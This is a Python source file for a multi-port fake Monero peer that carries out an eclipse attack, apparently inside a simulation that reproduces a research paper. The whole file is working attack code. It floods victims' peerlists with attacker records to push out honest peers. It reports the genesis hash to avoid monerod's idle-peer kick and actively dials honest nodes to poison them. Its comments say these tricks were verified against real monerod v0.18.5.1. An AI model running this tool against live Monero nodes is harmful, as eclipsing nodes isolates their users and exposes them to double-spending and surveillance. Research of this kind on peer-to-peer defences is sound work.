#!/usr/bin/env python3
"""Lightweight MULTI-PORT Monero fake peer (py-Levin) for a port-diversity eclipse.

Each fake-peer host owns one distinct-/24 IP and LISTENS ON A RANGE OF PORTS, so a
single host contributes many connectable (IP, port) records -- the paper's
"port-diversity". It is a persistent Levin responder (holds the connection and
answers HANDSHAKE / TIMED_SYNC / PING / support-flags), so the victim's monerod
counts it as a live OUTBOUND peer (validated: a real monerod keeps such a peer).
When any node dials it, it floods the dialer's graylist with the FULL fleet record
set (every fake-peer IP x every port), dominating peerlists and FIFO-evicting
benign entries. Verified against monerod v0.18.5.1: no per-IP/-24 peerlist cap, so
all (IP,port) records are accepted -> occupation can reach ~98% as in the paper.

Why not real monerod: one monerod listens on a single port (no port-diversity) and
costs ~270 MB; this Python peer is ~40 MB and does multi-port, so ~1,000 distinct
/24s fit easily and reproduce the paper's ~1,000-IP / ~5,000-record scale.

Stability: presents lagging-same-chain sync data (low height) so monerod treats it
as a behind-but-valid peer and does not churn it trying to sync.
"""
import random
import threading
import time

from agents import levin_lib as L
from agents.eclipse_injector import InjectorConfig, serve_forever, dial_and_handshake


def main():
    from agents.base_agent import BaseAgent
    from agents.agent_discovery import AgentDiscovery

    parser = BaseAgent.create_argument_parser("Monero multi-port fake peer")
    parser.add_argument("--port_base", "--port-base", dest="port_base", type=int, default=18080)
    parser.add_argument("--port_count", "--port-count", dest="port_count", type=int, default=50)
    parser.add_argument("--dial_interval", "--dial-interval", dest="dial_interval", type=int, default=30)
    parser.add_argument("--max_records", "--max-records", dest="max_records", type=int, default=250)
    # How many honest targets to actively dial per cycle. -1 = dial ALL (smoke
    # default). 0 = PURE LISTENER: dial nothing and rely on the eclipse_injector
    # fleet for N-I poisoning -- required at scale, where 1000 fake peers each
    # dialing ~1200 benign is O(N^2) and melts the sim. N>0 = dial a random N.
    parser.add_argument("--dial_sample", "--dial-sample", dest="dial_sample", type=int, default=-1)
    args, _unknown = parser.parse_known_args()

    class FakePeerAgent(BaseAgent):
        def _setup_agent(self):
            self._discovery = AgentDiscovery(str(self.shared_dir) if self.shared_dir else None)
            self._ports = list(range(args.port_base, args.port_base + max(1, args.port_count)))
            self._stop = threading.Event()
            self._rec_cache = []
            self._rec_ts = 0.0
            self._cfg = InjectorConfig(
                network_id=L.NETWORK_ID_MAINNET,
                peer_id=random.getrandbits(64),
                my_port=args.port_base,
                records_fn=self._fleet_records,
                height=1, cumdiff=1,            # lagging-same-chain: behind, not bogus-ahead
                max_records=args.max_records,
                logger=self.logger,
            )
            # One persistent Levin responder per port (port-diversity).
            for p in self._ports:
                threading.Thread(target=serve_forever,
                                 args=("0.0.0.0", p, self._cfg, self._stop),
                                 daemon=True).start()
            self.logger.info("FakePeerAgent listening on %d ports (%d..%d)",
                             len(self._ports), self._ports[0], self._ports[-1])
            # SYNC-CREDIBILITY: present the GENESIS block as our top_id. When we
            # report top_id == genesis hash, the victim's have_block(top_id) is
            # TRUE, so process_payload_sync_data() forces the connection to
            # state_normal (cryptonote_protocol_handler.inl:483) instead of
            # state_synchronizing. Only state_synchronizing peers are subject to
            # the idle-peer negative-score kick (inl:240, DROP_PEERS_ON_SCORE=-2
            # after ~2x IDLE_PEER_KICK_TIME=240s), so as a state_normal peer the
            # victim HOLDS us as a stable outbound peer. A null top_id (00..00) is
            # never have_block -> state_synchronizing -> idle-kicked -> host
            # blocked, which is exactly why the fleet churned out (5->2) and then
            # got banned in the /24-fix-only smoke. Genesis is immutable, so once
            # fetched we never refresh; height=1/top_version=1 still pass the
            # handshake version check (skipped for hard-fork version < 6 at h=0).
            threading.Thread(target=self._track_genesis, daemon=True).start()

        def _fleet_records(self):
            """Full port-diverse attacker set: every fake-peer/attacker host IP x
            every port in the range. Cached ~30s so we don't rebuild per response."""
            now = time.time()
            if self._rec_cache and now - self._rec_ts < 30:
                return self._rec_cache
            ips = []
            try:
                reg = self._discovery.get_agent_registry(force_refresh=True)
                agents = reg.get("agents", [])
                if isinstance(agents, dict):
                    agents = list(agents.values())
                for a in agents:
                    role = (a.get("attributes") or {}).get("eclipse_role")
                    if role in ("attacker", "fakepeer") and a.get("ip_addr"):
                        ips.append(a["ip_addr"])
            except Exception:  # noqa: BLE001
                pass
            recs = [(ip, p) for ip in ips for p in self._ports]
            self._rec_cache = recs
            self._rec_ts = now
            return recs

        def _poison_targets(self):
            """Honest reachable nodes + seeds to actively dial (paper's N-I): dialing
            them makes them whitelist us and later dial back -> flooded."""
            out = []
            try:
                reg = self._discovery.get_agent_registry(force_refresh=True)
                agents = reg.get("agents", [])
                if isinstance(agents, dict):
                    agents = list(agents.values())
                for a in agents:
                    role = (a.get("attributes") or {}).get("eclipse_role")
                    aid = a.get("id", "") or ""
                    if (role == "benign" or aid.startswith("monero-seed")) and a.get("ip_addr"):
                        out.append(a["ip_addr"])
            except Exception:  # noqa: BLE001
                pass
            return out

        def _daemon_rpc_urls(self):
            """RPC endpoints of real, synced nodes (miners/seeds) we can read the
            genesis hash from. Attackers/fakepeers are skipped (they have no chain)."""
            urls = []
            try:
                reg = self._discovery.get_agent_registry(force_refresh=True)
                agents = reg.get("agents", [])
                if isinstance(agents, dict):
                    agents = list(agents.values())
                for a in agents:
                    aid = a.get("id", "") or ""
                    ip = a.get("ip_addr")
                    if ip and (aid.startswith("miner") or aid.startswith("monero-seed")):
                        urls.append("http://%s:18081/json_rpc" % ip)
            except Exception:  # noqa: BLE001
                pass
            return urls

        def _track_genesis(self):
            """Fetch the immutable genesis block hash from a real node and present
            it as our top_id (see the state_normal note in _setup_agent). Genesis
            never changes, so on the first success we stop; until then keep retrying
            (a real node's RPC may not be up yet when we start)."""
            import requests  # lazy: only the fakepeer needs an HTTP client
            while not self._stop.is_set():
                for url in self._daemon_rpc_urls():
                    try:
                        r = requests.post(url, json={
                            "jsonrpc": "2.0", "id": "0",
                            "method": "get_block_header_by_height",
                            "params": {"height": 0}}, timeout=5)
                        h = (((r.json() or {}).get("result") or {})
                             .get("block_header") or {}).get("hash")
                        if h and len(h) == 64:
                            self._cfg.top_id = bytes.fromhex(h)
                            self.logger.info("fakepeer: genesis top_id set (%s) via %s", h, url)
                            return
                    except Exception:  # noqa: BLE001
                        continue
                time.sleep(3)

        def run_iteration(self):
            targets = self._poison_targets()
            if args.dial_sample == 0:
                targets = []  # pure listener: injectors handle N-I (scale)
            elif args.dial_sample > 0 and len(targets) > args.dial_sample:
                targets = random.sample(targets, args.dial_sample)
            dialed = 0
            for ip in targets:
                # dial on our base port; the target will whitelist us and dial back
                if dial_and_handshake(ip, self._ports[0], self._cfg, timeout=6):
                    dialed += 1
            self.logger.info("fakepeer: dialed %d/%d honest nodes; injected=%d conns=%d records=%d",
                             dialed, len(targets), self._cfg.injected, self._cfg.conns,
                             len(self._fleet_records()))
            return args.dial_interval

    agent = FakePeerAgent(
        agent_id=args.id, shared_dir=args.shared_dir,
        daemon_rpc_port=args.daemon_rpc_port, wallet_rpc_port=args.wallet_rpc_port,
        p2p_port=args.p2p_port, rpc_host=args.rpc_host, log_level=args.log_level,
        attributes=args.attributes,
    )
    agent.run()


if __name__ == "__main__":
    main()
